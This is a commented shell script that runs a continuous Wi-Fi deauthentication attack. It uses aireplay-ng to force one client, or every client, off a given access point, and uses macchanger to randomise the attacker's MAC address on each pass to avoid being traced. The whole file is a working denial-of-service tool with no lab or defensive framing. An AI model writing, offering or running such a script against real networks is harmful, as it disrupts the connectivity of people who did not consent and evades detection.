#!/bin/sh

# Initialize variables to store values for access point MAC address, interface, and client MAC address
ap_mac=""
interface=""
client=""

# Parse command-line options using getopts
while getopts "a:i:c:" opt; do
    case $opt in
        a)      ap_mac="$OPTARG"  # Assign the value of option 'a' to the variable ap_mac
        ;;
        i)      interface="$OPTARG"  # Assign the value of option 'i' to the variable interface
        ;;
        c)      client="$OPTARG"  # Assign the value of option 'c' to the variable client
        ;;
        \?)     echo "Invalid option -$OPTARG" >&2  # Print an error message if an invalid option is provided
        ;;
    esac
done

# Output the values of the variables
echo "AP $ap_mac"
echo "Interface $interface"

# Start an infinite loop
while true
do
    # Check if the client MAC address is provided
    if [ -n "$client" ]; then
	echo "Client $client"
        aireplay-ng -0 5 -a "$ap_mac" "$interface" -c "$client"  # Deauthenticate the client with the provided MAC address
    else
        aireplay-ng -0 5 -a "$ap_mac" "$interface"  # Deauthenticate all clients on the network
    fi

    # Disable the network interface
    ifconfig "$interface" down

    # Change the MAC address of the network interface
    macchanger -r "$interface" | grep "Current MAC:"

    # Set the network interface to monitor mode
    iwconfig "$interface" mode monitor

    # Enable the network interface
    ifconfig "$interface" up

    # Display the mode of the network interface
    iwconfig "$interface" | grep Mode

    # Sleep for 3 seconds before running the loop again
    sleep 3
done
